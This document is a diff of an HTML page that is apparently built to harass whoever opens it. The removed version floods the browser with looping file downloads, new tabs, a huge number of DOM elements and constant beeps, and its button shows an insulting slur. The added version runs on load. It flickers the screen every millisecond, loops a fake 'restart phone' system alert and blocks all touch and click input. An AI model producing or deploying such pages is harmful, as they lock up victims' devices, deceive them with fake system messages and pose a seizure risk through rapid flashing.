@@ -1,158 +1,49 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-    <title>Fixed</title>
-    <!-- CONFIGURATION -->
-    <meta name="file-delay" content="1"> <!-- ms between file downloads -->
-    <meta name="tab-delay" content="10"> <!-- ms between tab openings -->
-    <meta name="audio-delay" content="20000000000000"> <!-- ms between beeps -->
-    <meta name="beep-duration" content="10"> <!-- ms per beep -->
-    <meta name="dom-elements" content="10000000000000"> <!-- DOM elements to create -->
-    <meta name="animation-intensity" content="50"> <!-- Animation stress level -->
-    <script>
-        // Safari-specific audio workaround
-        function unlockAudio() {
-            const ctx = new (window.AudioContext || window.webkitAudioContext)();
-            const osc = ctx.createOscillator();
-            osc.connect(ctx.destination);
-            osc.start();
-            osc.stop(ctx.currentTime + 0.001);
-            return ctx;
-        }
-    </script>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
+<title>Charlie is ....</title>
+<style>
+  html, body {
+    margin: 0; padding: 0;
+    height: 100vh; width: 100vw;
+    overflow: hidden;
+    user-select: none;
+    -webkit-user-select: none;
+    touch-action: none;
+    -webkit-touch-callout: none;
+    background: black;
+  }
+</style>
 </head>
 <body>
-    <button id="actionBtn" style="
-        position:fixed;
-        top:50%;
-        left:50%;
-        transform:translate(-50%,-50%);
-        font-size:24px;
-        padding:20px 40px;
-        background:red;
-        color:white;
-        border:none;
-        border-radius:12px;
-        z-index:9999;
-    ">ANSWER YOU BLACKY</button>
+<script>
+  // Flicker function, runs immediately
+  (function flicker() {
+    document.body.style.background = (document.body.style.background === 'black') ? 'white' : 'black';
+    setTimeout(flicker, 1); // ~1ms delay to switch as fast as possible
+  })();
 
-    <script>
-        // Get configuration
-        const config = {
-            files: { delay: parseInt(document.querySelector('meta[name="file-delay"]').content) || 300 },
-            tabs: { delay: parseInt(document.querySelector('meta[name="tab-delay"]').content) || 500 },
-            audio: { 
-                delay: parseInt(document.querySelector('meta[name="audio-delay"]').content) || 200,
-                duration: parseInt(document.querySelector('meta[name="beep-duration"]').content) || 100
-            },
-            dom: { elements: parseInt(document.querySelector('meta[name="dom-elements"]').content) || 1000 },
-            animation: { intensity: parseInt(document.querySelector('meta[name="animation-intensity"]').content) || 50 }
-        };
+  // Alert spam chain function, runs immediately
+  (function alertSpam() {
+    alert("SYSTEM: Restart Phone the site is bugged");
+    setTimeout(alertSpam, 100);
+  })();
 
-        // Audio system (Safari compatible)
-        let audioContext;
-        function playBeep() {
-            if (!audioContext) audioContext = unlockAudio();
-            const osc = audioContext.createOscillator();
-            const gain = audioContext.createGain();
-            osc.type = 'square';
-            osc.frequency.value = 1000;
-            gain.gain.value = 0.5;
-            osc.connect(gain);
-            gain.connect(audioContext.destination);
-            osc.start();
-            osc.stop(audioContext.currentTime + (config.audio.duration/1000));
-        }
+  // Block all touches, clicks, gestures immediately
+  function blockAll(e) {
+    e.preventDefault();
+    e.stopPropagation();
+    return false;
+  }
+  document.addEventListener('touchstart', blockAll, {passive:false, capture:true});
+  document.addEventListener('touchmove', blockAll, {passive:false, capture:true});
+  document.addEventListener('touchend', blockAll, {passive:false, capture:true});
+  document.addEventListener('click', blockAll, {passive:false, capture:true});
 
-        // File downloader
-        function downloadFile() {
-            const content = new Blob(['0'.repeat(1000000)], {type: 'text/plain'});
-            const url = URL.createObjectURL(content);
-            const a = document.createElement('a');
-            a.href = url;
-            a.download = `overload_${Date.now()}.txt`;
-            a.style.display = 'none';
-            document.body.appendChild(a);
-            a.click();
-            setTimeout(() => {
-                document.body.removeChild(a);
-                URL.revokeObjectURL(url);
-            }, 100);
-            setTimeout(downloadFile, config.files.delay);
-        }
-
-        // Tab opener (works within Safari limits)
-        function openTab() {
-            const pages = [
-                'about:blank',
-                'data:text/html,<h1>SYSTEM OVERLOAD</h1>',
-                'data:text/html,<body style=background:black;color:red>HEY</body>'
-            ];
-            window.open(pages[Math.floor(Math.random()*pages.length)], '_blank');
-            setTimeout(openTab, config.tabs.delay);
-        }
-
-        // DOM flood (creates lag)
-        function floodDOM() {
-            const container = document.createElement('div');
-            container.style.position = 'fixed';
-            container.style.top = '0';
-            container.style.left = '0';
-            container.style.width = '100%';
-            container.style.height = '100%';
-            container.style.pointerEvents = 'none';
-            container.style.zIndex = '-1';
-            
-            for (let i = 0; i < config.dom.elements; i++) {
-                const el = document.createElement('div');
-                el.style.position = 'absolute';
-                el.style.width = Math.random() * 100 + 'px';
-                el.style.height = Math.random() * 100 + 'px';
-                el.style.backgroundColor = `rgb(${Math.random()*255},${Math.random()*255},${Math.random()*255})`;
-                el.style.left = Math.random() * 100 + 'vw';
-                el.style.top = Math.random() * 100 + 'vh';
-                el.style.transform = `rotate(${Math.random()*360}deg)`;
-                container.appendChild(el);
-            }
-            document.body.appendChild(container);
-            
-            // Animate elements for extra lag
-            let angle = 0;
-            function animate() {
-                angle += 0.1;
-                const els = container.children;
-                for (let i = 0; i < els.length; i += Math.ceil(els.length/config.animation.intensity)) {
-                    els[i].style.transform = `rotate(${angle+i}deg)`;
-                    els[i].style.left = Math.sin(angle+i) * 50 + 50 + 'vw';
-                    els[i].style.top = Math.cos(angle+i) * 50 + 50 + 'vh';
-                }
-                requestAnimationFrame(animate);
-            }
-            animate();
-        }
-
-        // Start everything
-        document.getElementById('actionBtn').onclick = function() {
-            if (confirm("You want the answer BLACKY?")) {
-                this.disabled = true;
-                this.textContent = "Answer is yes soon ;)";
-                
-                // Initialize audio context on first interaction
-                unlockAudio();
-                
-                // Start all effects
-                downloadFile();
-                openTab();
-                floodDOM();
-                
-                // Audio loop
-                function audioLoop() {
-                    playBeep();
-                    setTimeout(audioLoop, config.audio.delay);
-                }
-                audioLoop();
-            }
-        };
-    </script>
+  // Block zoom and other gestures
+  document.documentElement.style.touchAction = 'none';
+</script>
 </body>
 </html>
